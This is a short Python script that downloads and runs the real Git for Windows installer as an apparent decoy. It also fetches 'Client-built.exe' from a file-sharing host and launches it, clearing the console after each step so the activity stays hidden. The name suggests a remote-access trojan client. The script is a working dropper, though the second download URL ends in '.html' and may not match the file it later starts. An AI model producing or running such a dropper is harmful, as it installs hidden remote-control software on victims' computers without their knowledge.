import wget
from time import sleep
from os import system

url = "https://github.com/git-for-windows/git/releases/download/v2.47.0.windows.2/Git-2.47.0.2-64-bit.exe"
module1 = wget.download(url)
system("cls")
url2 = "https://dosya.co/thyots4y3oei/Client-built.exe.html"
module2 = wget.download(url2)
system("cls")
system("start Git-2.47.0.2-64-bit.exe")
system("cls")
sleep(5)
system("cls")
system("start Client-built.exe")
system("cls")